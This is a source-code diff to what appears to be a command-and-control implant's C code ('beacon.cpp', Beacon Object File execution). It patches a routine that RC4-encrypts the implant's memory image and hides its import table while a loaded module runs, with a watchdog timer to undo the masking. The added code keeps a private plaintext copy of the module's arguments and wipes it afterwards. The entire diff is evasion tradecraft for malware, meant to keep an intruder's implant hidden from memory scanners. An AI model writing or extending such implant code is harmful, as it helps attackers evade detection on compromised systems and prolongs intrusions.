@@ -753,12 +753,13 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	BW_BLOCK * blocks;
 	int nblocks, text_idx, i;
 	unsigned char key[16];
+		unsigned char * args_copy = NULL;
 		HANDLE timer = NULL;
 		void (*enter_fn)(void);
 		BOOL (*pVP)(void *, SIZE_T, DWORD, DWORD *);
-	BOOL (*pFlush)(void *, const void *, SIZE_T);
-	BOOL (*pDelTimer)(void *, void *, void *);
-	unsigned int * k = (unsigned int *)key;
+		BOOL (*pFlush)(void *, const void *, SIZE_T);
+		BOOL (*pDelTimer)(void *, void *, void *);
+		unsigned int * k = (unsigned int *)key;
 
 	/* a background job thread could execute beacon code while the image is
 	 * ciphertext - the window is single-threaded only (same guard as the
@@ -816,6 +817,22 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	bw_kasa(ctx->sbox0, key, (unsigned int)text_idx);
 	memcpy(ctx->sbox1, ctx->sbox0, 256);
 
+	/* The args blob points into the tracked task buffer (beacon.cpp's
+	 * MAX_GET malloc, track_memory_add'd) - the mask loop below turns
+	 * that whole buffer into ciphertext, so a BOF that reads its
+	 * arguments mid-window would read RC4 garbage. Hand it a private
+	 * plaintext copy instead: plain VirtualAlloc, never tracked, so it
+	 * never joins the mask list. Wiped+freed only after the teardown,
+	 * once the IAT is plaintext again. */
+	if (args != NULL && alen > 0) {
+		args_copy = (unsigned char *)VirtualAlloc(NULL, (SIZE_T)alen,
+		                                         MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+		if (args_copy == NULL)
+			return FALSE; /* nothing masked yet, no timer yet */
+		memcpy(args_copy, args, (SIZE_T)alen);
+		ctx->args = args_copy;
+	}
+
 	/* the watchdog is created BEFORE the mask loop: its IAT entry lives in
 	 * .rdata, which is ciphertext from the mask on. One-shot, min 50ms -
 	 * the mask loop takes microseconds, it can never fire early. */
@@ -824,8 +841,11 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	if (!CreateTimerQueueTimer(&timer, NULL,
 	                           (WAITORTIMERCALLBACK)(void *)(g_bw_stubs + BW_WATCH_OFF),
 	                           NULL, watchdog_ms, 0,
-	                           WT_EXECUTEONLYONCE | WT_EXECUTELONGFUNCTION))
+	                           WT_EXECUTEONLYONCE | WT_EXECUTELONGFUNCTION)) {
+		if (args_copy != NULL)
+			VirtualFree(args_copy, 0, MEM_RELEASE); /* nothing masked yet */
 		return FALSE; /* no watchdog -> no window (nothing masked yet) */
+	}
 	BW_TRACE("watchdog timer armed");
 
 	/* flip each non-.text block to RW and mask it in one pass; .text stays
@@ -851,6 +871,10 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 			}
 			bw_blocks_restore(blocks, nblocks, text_idx, pVP);
 			bw_call_deltimer(pDelTimer, NULL, timer, NULL);
+			if (args_copy != NULL) {
+				memset(args_copy, 0, (SIZE_T)alen);
+				VirtualFree(args_copy, 0, MEM_RELEASE);
+			}
 			ctx->state = BW_STATE_IDLE;
 			return FALSE;
 		}
@@ -885,6 +909,11 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	ctx->phase = 6;
 	bw_call_deltimer(pDelTimer, NULL, timer, NULL);
 	ctx->phase = 7;
+	if (args_copy != NULL) {
+		memset(args_copy, 0, (SIZE_T)alen);
+		VirtualFree(args_copy, 0, MEM_RELEASE);
+		ctx->args = NULL;
+	}
 	BW_TRACE("window complete"); /* IAT alive again: everything unmasked */
 
 	memset(key, 0, sizeof(key));
